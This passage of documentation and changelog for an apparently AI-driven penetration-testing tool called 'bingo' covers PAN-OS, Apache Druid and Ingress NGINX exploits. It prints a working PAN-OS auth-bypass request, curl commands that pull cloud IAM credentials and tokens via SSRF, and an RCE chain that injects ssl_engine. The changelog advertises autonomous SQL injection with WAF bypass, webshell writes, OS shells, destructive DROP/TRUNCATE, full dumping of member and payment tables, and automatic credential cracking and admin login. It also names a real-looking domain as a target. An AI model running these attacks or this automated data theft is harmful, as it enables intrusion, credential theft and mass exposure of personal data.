| **BP2** | Non-UTF8 byte (e.g. `0x88`) in any header | Parser error → **fail-open** (all traffic passes) | Ignores invalid param, parses normally |
| **BP3** | `charset=utf16le` in per-field `Content-Type` | Scans raw bytes → `:constructor` not visible | Decodes UTF-16LE → `:constructor` appears |
| **BP4** | Duplicate `Content-Type` headers in field | Uses last header (`charset=utf8`) → safe | Uses first header (`charset=utf16le`) → decodes payload |
| **BP5** | Trailing space in boundary end marker (`--b-- `) | Sees form ended → ignores rest | Invalid end marker → parses subsequent parts normally |

#### What bingo Tests (Skill #59)

```python
# Step 1: Detect React/Next.js framework
# Fingerprints: x-powered-by: Next.js, x-nextjs-* headers,
#               Vercel deployment headers, _next/static assets

# Step 2: Find Next-Action endpoint
# Probes common paths with Next-Action header
# Any 200/400/500 (or 403+WAF) confirms RSF surface

# Step 3: Detect WAF
# Send :constructor payload → HTTP 403 = WAF active

# Step 4: Test all 5 bypass techniques (safe probe only)
# Uses harmless "bingo-r2s-probe-safe" string
# Checks if response != 403 with WAF active = bypass confirmed
# evidence_level = VERIFIED for confirmed bypasses

# Step 5: Generate PoC curl commands for Burp verification
# Full curl commands for each bypass technique
# NOTE: No actual RCE payload — human verification required in Burp
```

#### Evidence Levels

| Finding | Evidence Level | Meaning |
|---------|---------------|---------|
| Framework indicators | `VERIFIED` | HTTP headers/paths confirmed |
| Next-Action endpoint | `VERIFIED` | Endpoint accepts RSF requests |
| WAF bypass confirmed | `VERIFIED` | Safe probe passes WAF (status != 403) |
| WAF present, bypass not tested | `INFERRED` | No RSF endpoint reachable |

#### Remediation

1. **Upgrade to Next.js >= 16.0.7** — CVE-2025-55182 patched
2. **WAF raw-body approach** (for custom deployments):
   - Strip all `0x00` bytes from request body
   - Apply double JSON-unescape to raw body string
   - Block on `:constructor` in the resulting raw bytes
   - This defeats all grammar un-equivalence bypasses
3. **Disable React Server Functions** if not required by the application
4. **Monitor `Next-Action` header** — log and alert on all RSF invocations

#### Bypass-Specific Mitigations

| Bypass | Mitigation |
|--------|-----------|
| BP1 (duplicate boundary) | Reject requests with multiple `boundary=` params |
| BP2 (non-UTF8 header bytes) | Strict UTF-8 validation — reject on parse failure (fail-closed) |
| BP3/BP4 (UTF-16LE encoding) | Normalize field charsets before scanning; disallow non-UTF-8 charsets |
| BP5 (trailing space end marker) | Strict boundary end marker validation |

---

### Apache Druid SSRF — ApacheDruidSSRFScanner (v2.1)

> **Research basis:**
> XBOW Security — Nico Waisman (September 23, 2025)
> "CVE-2025-27888: Server-Side Request Forgery via URL Parsing Confusion
>  in Apache Druid Proxy Endpoint"
> https://xbow.com/blog/apache-druid-proxy
>
> **Module:** `bingo/tools/apache_druid_ssrf.py` — Skill #60 ApacheDruidSSRFScanner

---

#### What is Apache Druid?

Apache Druid is a high-performance real-time analytics database widely deployed in
data pipelines and analytics platforms. Its built-in management console exposes an
HTTP proxy endpoint intended for internal cluster administration.

---

#### The Vulnerability: CVE-2025-27888

**Affected versions:** Apache Druid < 31.0.2 and < 32.0.1

The management console's proxy endpoint (`/proxy?url=...`) performs insufficient
validation of the destination URL, allowing attackers to make the Druid server issue
HTTP requests to arbitrary destinations. This is a classic **Server-Side Request
Forgery (SSRF)** enabled by URL parsing confusion.

**Critical impacts:**

| Impact | Detail |
|--------|--------|
| Cloud credential theft | IMDSv1 at `169.254.169.254` → IAM keys for AWS account takeover |
| GCP/Azure metadata | `metadata.google.internal` → service account tokens |
| Internal network access | Reach services behind firewall via Druid as HTTP proxy |
| Druid cluster enumeration | Access coordinator/broker/overlord APIs on internal ports |
| Data exfiltration | Query internal datasource APIs through the proxy |

---

#### How XBOW AI Discovered It

The discovery was made by XBOW's AI security system, which:

1. Trained on historical CVE data — prior Druid SSRF vulnerabilities existed on task
   and SQL endpoints
2. **Reasoned by analogy**: "If proxy-adjacent features were vulnerable before, the
   management proxy itself might also be vulnerable"
3. **Guessed the `/proxy` endpoint** (not documented publicly) after exhausting known
   patterns
4. Confirmed SSRF by analyzing error messages from the endpoint's response

This represents a zero-day discovered entirely by AI reasoning over vulnerability history.

---

#### What bingo Tests (Skill #60)

```
1. Apache Druid Detection (VERIFIED)
   ├── Fingerprint /unified-console.html
   ├── Test /druid/coordinator/v1/isLeader
   ├── Detect x-druid-* response headers
   ├── Check port 8888 (Druid default)
   └── Extract version from HTML body

2. Proxy Endpoint Discovery (VERIFIED)
   ├── /proxy
   ├── /druid/proxy
   └── /druid/coordinator/v1/proxy
       → Send invalid-URL probe → analyze error response

3. SSRF Confirmation — Cloud Metadata (VERIFIED)
   ├── AWS IMDSv1: 169.254.169.254/latest/meta-data/
   ├── AWS IAM:    169.254.169.254/latest/meta-data/iam/security-credentials/
   ├── GCP:        metadata.google.internal/computeMetadata/v1/
   └── Azure:      169.254.169.254/metadata/instance

4. SSRF Confirmation — Internal Services (LIKELY)
   ├── localhost:80, localhost:8080
   └── Druid cluster nodes:
       ├── Coordinator :8081  /druid/coordinator/v1/datasources
       ├── Broker      :8082  /druid/v2/datasources
       ├── Overlord    :8090  /druid/indexer/v1/task
       └── Historical  :8083  /druid/historical/v1/loadstatus

5. PoC Generation
   └── Full curl commands for Burp Suite validation
```

---

#### Evidence Levels

| Finding | Evidence Level | CVSS |
|---------|---------------|------|
| Druid console detected | VERIFIED | INFO |
| Vulnerable version identified | VERIFIED | 7.5 |
| Proxy endpoint accessible | VERIFIED | 7.5 |
| SSRF confirmed (internal URL) | VERIFIED | 9.1 |
| Cloud metadata exposed | VERIFIED | 9.8 |
| Internal service reached | LIKELY | 6.5 |

---

#### Sample PoC Output

```bash
# Cloud metadata extraction (AWS IMDSv1)
curl -sk 'http://target:8888/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'

# Internal Druid coordinator enumeration
curl -sk 'http://target:8888/proxy?url=http://127.0.0.1:8081/druid/coordinator/v1/datasources'

# GCP service account token
curl -sk 'http://target:8888/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
  -H 'Metadata-Flavor: Google'
```

---

#### AI Auto-Selection Criteria

bingo automatically activates Skill #60 when:
- `/druid/` paths are accessible on the target
- Port 8888 service is identified as Apache Druid
- Response body or headers contain "druid"
- `/unified-console.html` is served by the target

Cloud-hosted targets (AWS/GCP/Azure) are prioritized for metadata endpoint testing.

---

#### Remediation

| Action | Priority |
|--------|----------|
| Upgrade to Apache Druid **31.0.2+** or **32.0.1+** | CRITICAL |
| Block management console from external networks | CRITICAL |
| Enable IMDSv2 on AWS instances (PUT-based token required) | HIGH |
| Apply iptables rule: `iptables -A OUTPUT -d 169.254.169.254 -j DROP` on Druid host | HIGH |
| Whitelist allowed proxy destination URLs | MEDIUM |
| Monitor Druid proxy endpoint in WAF/IDS | MEDIUM |

---

### PAN-OS Auth Bypass — PanOSAuthBypassScanner (v2.1)

> **Research basis:**
> Assetnote / Searchlight Cyber — Adam Kues (February 12, 2025)
> "Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)"
> https://slcyber.io/research-center/nginx-apache-path-confusion-to-auth-bypass-in-pan-os-cve-2025-0108/
>
> **Module:** `bingo/tools/panos_auth_bypass.py` — Skill #61 PanOSAuthBypassScanner

---

#### The Architecture: Three-Layer Authentication

PAN-OS management interface uses a **Nginx → Apache → PHP** pipeline where
authentication is decided at the Nginx layer and passed downstream via HTTP header:

```
Client Request
    │
    ▼ Nginx  ──── checks URI against allowlist ──► X-pan-AuthCheck: on/off
    │              /unauth/* → AuthCheck=off
    ▼ Apache ──── applies RewriteRule → internal redirect → double-decode URL
    │
    ▼ PHP    ──── executes if AuthCheck=off (no credential check)
```

The critical flaw: Nginx and Apache **parse the same URL differently**.
Authentication is set at Nginx based on what Nginx sees, but code executes based
on what Apache resolves after its own URL processing.

---

#### The Bug: Double URL Decode via Apache mod_rewrite

Apache's per-directory `RewriteRule` triggers an **internal redirect**, which
causes the URL to be decoded a second time:

| Step | Who | URL state |
|------|-----|-----------|
| Attacker sends | — | `/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css` |
| Nginx decodes once | Nginx | `/unauth/%2e%2e/php/...` → no `..` → **AuthCheck=off** |
| Apache receives | Apache | Same raw URL, decodes once → `%2e%2e` still encoded |
| RewriteRule match | Apache | `/PAN_help/x.css` matches → **internal redirect** |
| Redirect re-decodes | Apache | `%2e%2e` → `..` (traversal appears!) |
| Path normalize | Apache | `/unauth/../php/ztp_gate.php` → `/php/ztp_gate.php` |
| PHP executes | PHP | AuthCheck=off → **runs with no authentication** ✅ |

**The single attack request:**

```http
GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1
Host: [PAN-OS management interface]
```

---

#### Affected Versions

| Branch | Vulnerable | Patched |
|--------|-----------|---------|
| PAN-OS 10.2.x | < 10.2.14 | **10.2.14+** |
| PAN-OS 11.0.x | < 11.0.7  | **11.0.7+** |
| PAN-OS 11.2.x | < 11.2.5  | **11.2.5+** |

---

#### Impact

| Scenario | Severity | CVSS |
|----------|----------|------|
| Auth bypass alone | CRITICAL | 9.3 |
| + CVE-2024-9474 privilege escalation chain | CRITICAL | **9.9** |
| Management config disclosure | HIGH | 8.5 |

The RCE chain mirrors CVE-2024-0012 (prior exploit widely used in the wild).

---

#### What bingo Tests (Skill #61)

```
1. PAN-OS Management Interface Fingerprint (VERIFIED)
   ├── /php/login.php  → PAN-OS login page
   ├── /global-protect/login.esp
   ├── x-pan-* response headers
   ├── HTML body: "GlobalProtect", "Palo Alto Networks"
   └── Port 443 / 4443 / 8443 probing

2. Version Extraction (VERIFIED)
   └── Regex: pan-os[\s/v]+(\d+\.\d+\.\d+) → vulnerable range check

3. CVE-2025-0108 Auth Bypass Test (VERIFIED)
   ├── /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css
   ├── /unauth/%252e%252e/php/login.php/PAN_help/x.css
   ├── /unauth/%252e%252e/php/errors.php/PAN_help/x.js
   └── /unauth/%252e%252e/php/php_session.php/PAN_help/x.html
       → HTTP 200 + PHP body (not login redirect) = BYPASS CONFIRMED

4. RCE Chain Assessment (LIKELY)
   └── auth_bypass_confirmed → rce_chain_possible flag
       (CVE-2025-0108 + CVE-2024-9474 combination)
```

---

#### Evidence Levels

| Finding | Evidence Level | CVSS |
|---------|---------------|------|
| PAN-OS interface detected | VERIFIED | INFO |
| Vulnerable version | VERIFIED | 7.5 |
| Auth bypass confirmed | VERIFIED | 9.3 |
| RCE chain possible | LIKELY | 9.9 |

---

#### AI Auto-Selection Criteria

bingo automatically activates Skill #61 when:
- Port 443 or 4443 returns PAN-OS management interface HTML
- Response body contains "GlobalProtect" or "Palo Alto Networks"
- `/php/login.php` returns HTTP 200 with PAN-OS content
- `x-pan-*` response headers are detected

---

#### Remediation

| Action | Priority |
|--------|----------|
| Upgrade to **PAN-OS 10.2.14+** (10.2.x branch) | CRITICAL |
| Upgrade to **PAN-OS 11.0.7+** (11.0.x branch) | CRITICAL |
| Upgrade to **PAN-OS 11.2.5+** (11.2.x branch) | CRITICAL |
| **Restrict management interface to trusted IPs** | CRITICAL |
| Remove management interface from internet exposure | CRITICAL |
| Apply Palo Alto advisory PAN-273971 compensating controls | HIGH |

---

### IngressNightmare — IngressNightmareScanner (v2.1)

> **Research basis:**
> Wiz Research — Nir Ohfeld, Ronen Shustin, Sagi Tzadik, Hillai Ben-Sasson (March 24, 2025)
> "IngressNightmare: CVE-2025-1974 — 9.8 Critical RCE in Ingress NGINX for Kubernetes"
> https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
>
> **Module:** `bingo/tools/ingress_nightmare_rce.py` — Skill #62 IngressNightmareScanner
>
> **CVEs:** CVE-2025-1974 (CVSS 9.8) · CVE-2025-24514 · CVE-2025-1097 · CVE-2025-1098

---

#### Impact at Scale

| Metric | Value |
|--------|-------|
| Cloud environments affected | **43%** |
| Publicly exposed vulnerable clusters | **6,500+** (Fortune 500 included) |
| ingress-nginx cluster share | 41% of internet-facing clusters |
| CVSS Score | **9.8 Critical** |

---

#### Architecture: Why the Bug Exists

Ingress NGINX Controller translates Kubernetes Ingress objects into NGINX
configurations and validates them with `nginx -t`. An admission webhook does this
validation — it is **unauthenticated by default**, accessible from any pod.

```
External Attacker / Internal Pod
    │
    ├──[Phase 1: Upload .so payload]──────────────────────────────────────
    │   POST /  (HTTP to NGINX port 80/443)
    │   Body: ELF shared library > 8KB
    │   Content-Length: 9999999  ← larger than body → NGINX hangs, FD stays open
    │   Result: /proc/<nginx_pid>/fd/<n>  ← tmpfile accessible via ProcFS
    │
    └──[Phase 2: Admission Controller Injection]──────────────────────────
        POST https://ingress-nginx-controller:8443/networking.k8s.io/v1/ingresses
        Body: AdmissionReview JSON with malicious annotation
              → ssl_engine /proc/<pid>/fd/<n>;  (loads our .so!)
              → nginx -t executes → .so constructor runs → RCE ✓
              → ClusterRole secret access → kubectl get secrets --all-namespaces
```

---

#### CVE Chain Detail

| CVE | Injection Point | Bypass Required | Severity |
|-----|----------------|-----------------|---------|
| **CVE-2025-24514** | `auth-url` annotation | URL unsanitized → direct injection | 8.8 |
| **CVE-2025-1097** | `auth-tls-match-cn` | `CN=...#(\n)` comment escape | 8.8 |
| **CVE-2025-1098** | Mirror UID field | Non-annotation field, no regex filter | 8.8 |
| **CVE-2025-1974** | `ssl_engine` directive | Undocumented OpenSSL module, any position | **9.8** |

**Why `ssl_engine` and not `load_module`?**

```
load_module → must appear at start of config → injection context is mid-config → FAILS
ssl_engine  → OpenSSL module, works anywhere in config → loads .so at nginx -t → RCE ✓
```

---

#### What bingo Tests (Skill #62)

```
1. Kubernetes API Server Detection (VERIFIED)
   └── /api/v1, /apis, /version → gitVersion extraction

2. Ingress NGINX Fingerprint (VERIFIED)
   ├── server: nginx header
   ├── ingress-nginx version regex
   └── /metrics, /healthz endpoints

3. Version Vulnerable Check (VERIFIED)
   └── < 1.11.5 or < 1.12.1 → vulnerable flag

4. Admission Controller Exposure (VERIFIED)
   ├── Port 8443/443 probe with AdmissionReview JSON
   └── Unauthenticated response → CRITICAL finding

5. Unauthenticated Access Confirmation (VERIFIED)
   └── Safe AdmissionReview probe → acceptance check

6. Annotation Injection Surface Mapping (VERIFIED/LIKELY)
   ├── CVE-2025-24514: auth-url annotation
   ├── CVE-2025-1097: auth-tls-match-cn annotation
   └── CVE-2025-1098: mirror URI annotation

7. RCE Chain Assessment (LIKELY)
   └── admission accepts requests + injection surface
       → client body .so upload + ssl_engine path
       → ClusterRole all-namespace secret access
```

---

#### SSRF Pairing

```
External SSRF vulnerability (any target)
    → pivot to internal Kubernetes pod network
    → reach ingress-nginx admission controller (port 8443)
    → no authentication required
    → CVE-2025-1974 RCE → cluster takeover
```

bingo's SSRF scanners (ApacheDruidSSRF #60, SSRF #11, etc.) automatically
chain with IngressNightmareScanner when internal cluster access is detected.

---

#### Evidence Levels

| Finding | Evidence Level | CVSS |
|---------|---------------|------|
| K8s cluster detected | VERIFIED | INFO |
| Vulnerable version | VERIFIED | 8.8 |
| Admission controller exposed | VERIFIED | 9.8 |
| Unauthenticated access | VERIFIED | 9.8 |
| Annotation injection surface | VERIFIED/LIKELY | 8.8 |
| Full RCE chain | LIKELY | 9.8 |

---

#### Remediation

| Action | Priority |
|--------|----------|
| Upgrade to **ingress-nginx 1.11.5+** (1.11.x branch) | CRITICAL |
| Upgrade to **ingress-nginx 1.12.1+** (1.12.x branch) | CRITICAL |
| **NetworkPolicy**: only kube-apiserver → port 8443 | CRITICAL |
| Disable admission webhook if upgrade impossible | HIGH |
| **Migrate to Kubernetes Gateway API** (ingress-nginx EOL Nov 2025) | HIGH |

> **Note:** ingress-nginx reached End of Life on **November 12, 2025**.
> All users must migrate to [Kubernetes Gateway API](https://gateway-api.sigs.k8s.io/)
> or an alternative controller (Traefik, HAProxy, NGINX Gateway Fabric).

---

### Prompt Cache Optimizer — Three-Breakpoint Architecture (v2.1)

> **Research basis:**
> ProjectDiscovery Engineering — "How We Cut LLM Cost with Prompt Caching"
> https://projectdiscovery.io/blog/how-we-cut-llm-cost-with-prompt-caching
> **Module:** `bingo/models/prompt_cache.py` — integrated into all providers

---

#### Background: The Repetition Waste Problem

Every time bingo executes a pipeline step, it sends a message to the AI. Without caching,
the entire static system prompt (≈20,000 characters) and skill definitions (60 skills) are
re-sent from scratch on **every single step**. For a 28-step pipeline run, this wastes:

```
25 steps × 20,000-char system prompt = 500,000 characters re-sent (every time)
```

The Prompt Cache Optimizer eliminates this repetition using three techniques directly adapted
from ProjectDiscovery's production findings.

---

#### Three-Breakpoint Architecture (BP1 / BP2 / BP3)

The prompt is divided into three cacheable segments, each with its own cache breakpoint:

| Breakpoint | Content | Change Frequency | Cache Effect |
|-----------|---------|-----------------|-------------|
| **BP1** | `UNIVERSAL_PENTEST_CORE` + model-specific instructions | Almost never | Cached for the entire session (day) |
| **BP2** | Warmup history + 62 skill definitions | Only on new skill releases | Cached until skill list changes |
| **BP3** | Conversation history (last 12 turns) | Every turn | Sliding window — previous turns re-cached |

```
Message structure with cache breakpoints:

[system: UNIVERSAL_PENTEST_CORE + MODEL_EXTRA]  ← BP1 ✦ cache_control: ephemeral
[user/asst: warmup × 4 + skill block]           ← BP2 ✦ cache_control: ephemeral
[user/asst: last 12 turns of conversation]      ← BP3 ✦ cache_control: ephemeral
[user: DYNAMIC TAIL — target URL + date]        ← NO cache mark (changes every call)
```

---

#### Relocation Trick

The most impactful single change. Dynamic content that changes every call (current target URL,
session date) is moved to the **very end** of the prompt, after all cached segments.

**Before (cache-busting every turn):**
```
[STATIC 20k chars] [TARGET: loan2.koweb.co.kr  today 12:34:56] [TOOLS 10k chars]
                    ↑ changes every turn → invalidates everything that follows
```

**After (static prefix stays valid):**
```
[STATIC 20k chars cached] [TOOLS 10k chars cached] … [TARGET + DATE at the tail]
                                                       ↑ only this tiny section changes
```

Cache hit rate jump: **7% → 74%** (ProjectDiscovery empirical data, 20+ step tasks).

---

#### Frozen Datetime

Using a full timestamp (`2026-06-15 00:07:33`) in the system prompt causes a cache miss every
minute. bingo now uses only the current **date** (`2026-06-15`) in the prompt, freezing it for
the entire day and preventing unnecessary cache invalidation during long pipeline runs.

---

#### Provider Support

| Provider | Cache Mechanism | Implementation |
|---------|----------------|---------------|
| **Claude (Anthropic)** | Native `cache_control: {"type": "ephemeral"}` | 3 breakpoints injected; `anthropic-beta: prompt-caching-2024-07-31` header |
| **DeepSeek** | Server-side prefix caching | `prefix_caching: true` payload parameter |
| **OpenAI / GPT** | Automatic prefix cache | Structural ordering maximizes cache-hit ratio (no explicit param) |
| **GLM / Qwen / Ollama** | Structural ordering | Same structural optimization as OpenAI |

---

#### Cost Model

| Operation | Cost multiplier |
|-----------|----------------|
| Cache write (first call) | 1.25× normal token price |
| Cache read (cache hit) | **0.10×** normal token price |
| Net saving at 74% hit rate | **~70% cost reduction** |

Anthropic cache TTL: 5 minutes (refreshed on each read). DeepSeek: automatic, no TTL concern.

---

#### Expected Impact on bingo Pipeline

| Pipeline steps | Estimated hit rate | Cost reduction |
|---------------|-------------------|---------------|
| 9 phases (standard) | ~54% | ~54% |
| 23 steps (full exploit) | ~74% | **~70%** |
| Same budget → can run | 2.5× more targets | — |

---

#### Cache Statistics Output (example)

```
⚡ Prompt Cache Optimizer active — BP1(system)/BP2(skills)/BP3(conversation)
🔑 Anthropic prompt-caching-2024-07-31 beta header active — 3 cache_control markers
📅 Frozen datetime: 2026-06-15 — prevents per-minute cache busting
📌 Relocation trick: dynamic content moved to prompt tail → static cache valid

... (after 10 pipeline steps) ...

📊 Cache stats: total=10 | hits=8(80%) | saved≈160000tok | cost_reduction≈70%
```

---

## Changelog

### v2.8.0 — Advanced SQLi Engine: Beyond sqlmap *(2026-06)*

**New Module:** `bingo/tools/sqli_advanced.py` — **SqliAdvancedEngine**  
Fully autonomous advanced SQL injection engine surpassing sqlmap in automation, WAF bypass coverage, and post-exploitation depth.

**Core Capabilities:**
| Feature | Detail |
|---|---|
| Tamper Scripts | 60+ tampers: space substitution (10+), encoding (10+), keyword manipulation (15+), WAF-specific (Korean WAPPLES/GENIAN/Cloudbric + Cloudflare/ModSecurity/F5/Imperva/Akamai) |
| WAF Auto-Match | Detects WAF → auto-selects optimal tamper chain (no manual config) |
| OOB Extraction | DNS exfiltration (MySQL LOAD_FILE UNC / MSSQL xp_dirtree / Oracle UTL_HTTP / PG COPY PROGRAM) |
| Level System | 1 (GET only) → 3 (headers) → 5 (all surfaces + heavy payloads) |
| Risk System | 1 (read-only) → 2 (OR-based + webshell write) → 3 (destructive: DROP/TRUNCATE) |
| LOAD_FILE | Auto-reads /etc/passwd, /etc/my.cnf, config.php, wp-config.php, database.php (GnuBoard/WP/CI) |
| INTO OUTFILE | Writes PHP webshell to 7 candidate paths automatically |
| Stacked RCE | MSSQL → xp_cmdshell / OLE Automation; PostgreSQL → COPY TO PROGRAM; MySQL → general_log shell |
| UDF Injection | MySQL UDF DLL upload → `sys_exec()` OS shell; MSSQL CLR assembly |
| Second-Order | Detects 2nd-order injection: stores payload in register/profile → triggers in mypage/dashboard |
| Hash Analyzer | Auto-classifies MD5/SHA1/SHA256/bcrypt/MySQL-hash/MSSQL-hash/PHPass/SHA512crypt (18 types) |
| Quick Crack | In-memory dictionary crack for common passwords (including Korean patterns) |
| DB Fingerprint | Precise version/OS/arch detection + CVE matching for vulnerable MySQL versions |
| Header Injection | Tests Cookie, Referer, User-Agent, X-Forwarded-For, Host (Level ≥ 3) |

**Advanced SQLi Pipeline:**
```python
engine = SqliAdvancedEngine(
    request_fn=request_fn,
    db_type="mysql",       # or "unknown" → auto-detect
    waf_type="wapples",    # → korean_waf_bypass + space2comment + versionedmorekeywords
    level=3,               # Test GET/POST/Cookie/Headers
    risk=2,                # Include webshell write
    oob_domain="xxx.oastify.com",  # Enable DNS OOB
)
report = engine.auto_scan(url, params=["id", "search", "category"])
# → error-based → time-based → UNION → LOAD_FILE → webshell → stacked RCE
# → header injection → hash extraction → hashcat commands
# → auto-triggers DbDumper (v2.7.0) on success
```

**Tamper Auto-Selection by WAF:**
| WAF | Auto-Selected Tampers |
|---|---|
| Cloudflare | space2comment + randomcase + versionedmorekeywords + charencode |
| WAPPLES (한국) | korean_waf_bypass + space2comment + versionedmorekeywords |
| GENIAN (한국) | korean_comment_bypass + space2hash + randomcase |
| Cloudbric (한국) | korean_waf_bypass + space2mysqlblank + randomcomments |
| GnuBoard | gnuboard_bypass + space2comment + randomcase |
| ModSecurity | modsecurityversioned + space2comment + randomcase |
| Imperva | securesphere + space2comment + versionedmorekeywords |
| Unknown | space2comment + randomcase + charencode + versionedmorekeywords |

**Hash Auto-Cracking:**
```
MD5(32)      → hashcat -m 0   (instant for common passwords)
SHA1(40)     → hashcat -m 100
MySQL-hash   → hashcat -m 300
bcrypt       → hashcat -m 3200
MSSQL 2012+  → hashcat -m 1731
PHPass/WP    → hashcat -m 400
```

**Integration:**
- `tools/__init__.py`: `_get_sqli_advanced()` lazy import
- `system_prompt.py`: PHASE 10 in auto-orchestration pipeline
- `strings.py`: 18 new i18n keys (ko/zh/en)

---

### v2.7.0 — DB Full Auto-Dump Engine *(2026-06)*

**New Module:**
- `bingo/tools/db_dumper.py` — **DB Auto-Dump Engine**: Immediately triggered after any successful exploitation (SQLi confirmed, WebShell uploaded, RCE achieved). Auto-dumps the entire database with zero manual effort.

**Core Capabilities:**
| Feature | Detail |
|---|---|
| DB Support | MySQL, MSSQL, PostgreSQL, SQLite, Oracle |
| Auto Table Classification | admin (priority 100) → member (90) → sensitive (50) → other |
| Member Table Detection | `member/user/account/customer/g5_member/xe_member/mb_` and 20+ variants |
| Admin Table Detection | `admin/administrator/manager/staff/operator/g5_admin/xe_admin` |
| Sensitive Table Detection | `payment/card/order/transaction/session/token/config` |
| Credential Extraction | Auto-identifies ID/email + password/hash columns → `CREDENTIALS_{table}.json` |
| Batch Pagination | 500 rows per request, up to 50,000 rows per table |
| UNION SQLi Dump | `dump_via_sqli_union()` — paginates via `GROUP_CONCAT` + `LIMIT/OFFSET` |
| WebShell Dump | `gen_webshell_dump_cmd()` — generates `mysqldump`/`sqlcmd`/`psql`/`sqlite3` commands |
| Output Format | JSON + CSV (UTF-8 BOM) per table + `DUMP_SUMMARY.txt` |

**Auto-Dump Pipeline:**
```python
# Triggered automatically by AI after any successful exploit
dumper = DbDumper(query_fn=sql_exec, db_type="mysql", target=base_url)
report = dumper.auto_dump(
    dump_member=True,    # 회원 전체 덤프
    dump_admin=True,     # 관리자 전체 덤프
    dump_sensitive=True, # 결제/세션 덤프
)
# → CREDENTIALS_admin.json (관리자 ID/PW hash)
# → admin login attempt auto-triggered
# → hashcat cracking command suggested
```

**Post-Dump Actions (fully automated):**
1. `CREDENTIALS_*.json` → auto-attempt admin login on `/admin`, `/manage`, `/adm`
2. Password hash detected → suggest `hashcat -m {mode}` with rockyou.txt
3. Member email list → note for credential stuffing analysis
4. Full dump paths added to pentest report via `ReportBuilder`

**Integration:**
- `tools/__init__.py`: `_get_db_dumper()` lazy import
- `system_prompt.py`: `=== v2.7.0 DB AUTO-DUMP ENGINE DECISION RULES ===` — PHASE 9 in auto pipeline
- `strings.py`: 14 new i18n keys (ko/zh/en)

---

### v2.6.0 — Advanced Attack Layer: 15 New Engines (SSTI/Smuggling/Recon/Nuclei/BizLogic/DOM-XSS/Buckets/...) *(2026-06)*

**New Modules — TIER 1 (Core Attack Primitives):**
- `bingo/tools/ssti_scanner.py` — SSTI Auto-Engine: polyglot probing across 8 template engines (Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, Pebble, Thymeleaf), confirmed RCE chains per engine
- `bingo/tools/param_discovery.py` — Parameter Auto-Discovery: hidden param fuzzing (200+ wordlist + HTML/JS extraction), header injection bypass (X-Forwarded-For, X-Original-URL), HTTP Parameter Pollution
- `bingo/tools/subdomain_takeover.py` — Subdomain Takeover Scanner: dangling CNAME detection, 23 service fingerprints (AWS S3, GitHub Pages, Heroku, Netlify, Vercel, Azure, Cafe24, Naver Blog...)
- `bingo/tools/smuggling_scanner.py` — HTTP Request Smuggling: CL.TE / TE.CL / TE.TE via raw socket requests, timing-based detection, 6 TE.TE obfuscation variants
- `bingo/tools/race_condition.py` — Race Condition Engine: thread burst (20 concurrent) + last-byte synchronization for TOCTOU attacks on coupons, points, payments

**New Modules — TIER 2 (Protocol & Auth Depth):**
- `bingo/tools/graphql_tester.py` — GraphQL Deep Tester: introspection dump, batching DoS, alias-based rate limit bypass, schema-aware IDOR detection
- `bingo/tools/twofa_bypass.py` — 2FA/OTP Bypass: brute-force, response manipulation hints, OTP reuse, backup code exposure, authentication step-skipping
- `bingo/tools/cache_poison.py` — Cache Poisoning/Deception: 14 unkeyed headers, Fat GET injection, path-suffix cache deception (/profile.css, /data.js)
- `bingo/tools/deserialize_tester.py` — Deserialization Tester: Java/PHP/Python Pickle/.NET ViewState/AMF magic-byte detection, ysoserial command generation
- `bingo/tools/recon_engine.py` — Domain Recon Engine: crt.sh subdomain CT enumeration, port scan, tech fingerprinting, WAF/CDN detection, email harvesting

**New Modules — TIER 3 (Wide-Coverage Automation):**
- `bingo/tools/nuclei_runner.py` — Nuclei CVE Runner: nuclei binary integration OR 15 built-in templates (.env, phpinfo, git, wp-config, Jenkins, Kibana, Swagger, Spring4Shell, Apache path traversal...)
- `bingo/tools/bizlogic_fuzzer.py` — Business Logic Fuzzer: negative/overflow amounts, workflow skip, coupon abuse (ADMIN/FREE/TEST/NULL), quantity manipulation (0/-1/INT_MAX)
- `bingo/tools/dom_xss_scanner.py` — DOM XSS Scanner: static source/sink analysis across JS files, vulnerable library detection (jQuery/AngularJS/Bootstrap), URL fragment reflection testing
- `bingo/tools/api_version_enum.py` — API Version Enumerator: 30+ version paths, auth bypass per version, security regression detection (SQL errors, debug info, swagger leaks)
- `bingo/tools/cloud_bucket_scanner.py` — Cloud Bucket Scanner: AWS S3/GCS/Azure Blob public access & listability check, 20+ name permutations, sensitive file detection (.env/.sql/.key/backup)

**Integration:**
- All 15 modules registered in `bingo/tools/__init__.py` via lazy import
- `system_prompt.py` updated: `=== v2.6.0 ADVANCED ATTACK LAYER DECISION RULES ===` + Full 8-Phase Pipeline (`PHASE 0: Recon → PHASE 8: PostExploit`)

**i18n:** 40 new string keys (ko/zh/en) for all 15 new engines

**Auto-Orchestration Pipeline (v2.6.0):**
```
PHASE 0: ReconEngine → SubdomainTakeover
PHASE 1: NucleiRunner (quick wins)
PHASE 2: JsAnalyzer → ParamDiscovery → ApiVersionEnum → CloudBucketScanner
PHASE 3: JWT/2FA/AuthBypass
PHASE 4: SQLi → SSTI → XXE → GraphQL
PHASE 5: BizLogic → RaceCondition → UploadBypass
PHASE 6: Smuggling → CachePoison → IDOR
PHASE 7: DomXSS → SSRF
PHASE 8: PostExploit → ReportBuilder
```

---

### v2.5.0 — Full Attack Automation Suite: JS/IDOR/Auth/SSRF/XXE/Upload/Report/CMS/PostExploit *(2026-06)*

**New Modules (9 engines):**
- `bingo/tools/js_analyzer.py` — JS Auto-Analyzer: API endpoint extraction, hardcoded secret detection (AWS keys, JWT secrets, passwords), admin path discovery, GraphQL/WebSocket endpoint enumeration from JS bundles
- `bingo/tools/idor_scanner.py` — IDOR/Privilege Escalation Auto-Scanner: horizontal (user-to-user) and vertical (user-to-admin) IDOR detection with auto ID mutation (±1, ±2, common IDs), response comparison
- `bingo/tools/auth_bypass.py` — Auth Bypass Automation Engine: JWT vulnerability testing (alg:none, weak secret brute-force, kid injection), OAuth redirect_uri manipulation, password reset Host header injection, session token analysis
